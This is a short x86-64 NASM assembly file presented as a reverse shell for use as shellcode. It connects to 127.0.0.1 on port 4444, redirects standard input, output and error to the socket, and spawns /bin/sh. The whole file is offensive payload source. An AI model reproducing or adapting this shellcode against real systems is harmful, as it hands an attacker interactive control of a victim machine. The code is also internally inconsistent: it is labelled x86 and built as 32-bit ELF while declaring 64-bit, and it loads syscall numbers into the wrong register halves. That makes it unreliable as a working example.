; A simple reverse shell in nasm x86
; This program can be used as a shellcode
; To compile :
; nasm -f elf rev.s -o rev.o
; ld rev.o -o rev


BITS 64

global _start

_start:
      mov ah, 41
      mov dil, 0x2 ; AF_INET
      mov sil, 0x1 ; SOCK_STREAM
      mov dh, 0x6 ; TCP
      syscall
      push rax

_connect_to_socket:
      pop rdi
      push rdi
      
      ; Allocate 16 bytes for the sockaddr struct
      xor eax, eax
      sub rsp, 16
      mov [rsp], rax
      mov [rsp+8], rax
      ; Initializing the struct
      mov byte [rsp], 0x2
      mov word [rsp+2], 0x5c11 ; 4444
      mov byte [rsp+4], 0x7f
      mov byte [rsp+7], 0x01   ; 127.0.0.1 
      ; sin_zero is already eq to zero bc we already set the whole 16bytes to sin_zero
      
      mov ah, 42
      mov rsi, rsp
      mov dh, 0x10
      syscall

_duplicate_fd_stdin:
      mov ah, 33
      pop rdi
      push rdi
      xor rsi, rsi
      syscall

_duplicate_fd_stdout:
      mov ah, 33
      pop rdi
      push rdi
      mov sil, 1
      syscall

_duplicate_fd_stderr:
      mov ah, 33
      pop rdi
      push rdi
      mov sil, 2
      syscall

_spawn_shell:
      mov ah, 59
      mov rdi, 0x68732f6e69622f
      xor rsi, rsi
      xor rdx, rdx
      syscall      
